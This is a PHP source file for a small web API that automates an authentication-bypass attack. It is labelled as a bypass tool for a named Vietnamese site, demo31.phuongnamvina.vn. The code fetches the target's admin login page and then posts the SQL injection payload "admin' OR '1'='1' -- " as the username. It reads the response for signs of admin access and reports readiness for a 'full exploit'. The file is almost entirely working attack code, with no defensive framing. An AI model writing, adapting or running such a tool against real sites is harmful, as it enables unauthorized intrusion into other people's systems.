<?php
/*
 * Simple Test API for demo31.phuongnamvina.vn bypass
 * Debug endpoint for penetration_tester_simple.php
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

function testTargetConnectivity($targetUrl) {
    $loginUrl = $targetUrl . '/admin/login.php';
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $loginUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'accessible' => ($httpCode >= 200 && $httpCode < 400),
        'http_code' => $httpCode,
        'response_length' => strlen($response),
        'error' => $error,
        'contains_login_form' => stripos($response, 'login') !== false || stripos($response, 'username') !== false
    ];
}

function attemptSQLInjectionBypass($targetUrl) {
    $adminUrl = $targetUrl . '/admin/';
    $sqlPayload = "admin' OR '1'='1' -- ";
    
    $postData = http_build_query([
        'username' => $sqlPayload,
        'password' => 'anything',
        'login' => '1'
    ]);
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $adminUrl,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        ]
    ]);
    
    $fullResponse = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $error = curl_error($ch);
    curl_close($ch);
    
    $headers = substr($fullResponse, 0, $headerSize);
    $body = substr($fullResponse, $headerSize);
    
    // Check for successful login indicators
    $successIndicators = ['dashboard', 'admin panel', 'welcome', 'logout', 'đăng xuất', 'quản trị'];
    $loginSuccess = false;
    
    foreach ($successIndicators as $indicator) {
        if (stripos($body, $indicator) !== false) {
            $loginSuccess = true;
            break;
        }
    }
    
    return [
        'bypass_success' => $loginSuccess,
        'http_code' => $httpCode,
        'response_length' => strlen($body),
        'error' => $error,
        'contains_admin_content' => $loginSuccess,
        'response_preview' => substr(strip_tags($body), 0, 200)
    ];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $targetUrl = $_POST['target_url'] ?? '';
        
        if (empty($targetUrl)) {
            throw new Exception('Target URL is required');
        }
        
        $targetUrl = rtrim($targetUrl, '/');
        
        // Test 1: Basic connectivity
        $connectivityTest = testTargetConnectivity($targetUrl);
        
        // Test 2: SQL Injection attempt
        $bypassTest = attemptSQLInjectionBypass($targetUrl);
        
        $result = [
            'success' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'target_url' => $targetUrl,
            'tests' => [
                'connectivity' => $connectivityTest,
                'sql_injection_bypass' => $bypassTest
            ],
            'overall_status' => [
                'target_reachable' => $connectivityTest['accessible'],
                'login_page_found' => $connectivityTest['contains_login_form'],
                'bypass_successful' => $bypassTest['bypass_success']
            ],
            'recommendations' => []
        ];
        
        // Generate recommendations based on test results
        if (!$connectivityTest['accessible']) {
            $result['recommendations'][] = 'Target không thể truy cập - kiểm tra URL và kết nối mạng';
        } elseif (!$connectivityTest['contains_login_form']) {
            $result['recommendations'][] = 'Không tìm thấy login form - thử endpoint khác';
        } elseif (!$bypassTest['bypass_success']) {
            $result['recommendations'][] = 'SQL injection bypass thất bại - thử payload khác hoặc method khác';
        } else {
            $result['recommendations'][] = 'Tất cả test thành công - sẵn sàng cho full exploit';
        }
        
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage(),
            'timestamp' => date('Y-m-d H:i:s')
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    
} else {
    // GET request - show API info
    echo json_encode([
        'api_name' => 'Simple Bypass Test API',
        'version' => '1.0',
        'description' => 'Basic connectivity and bypass testing for demo31.phuongnamvina.vn',
        'usage' => 'POST target_url to test',
        'tests_performed' => [
            'Target connectivity test',
            'Login page detection',
            'SQL injection bypass attempt',
            'Response analysis'
        ]
    ], JSON_PRETTY_PRINT);
}
?> 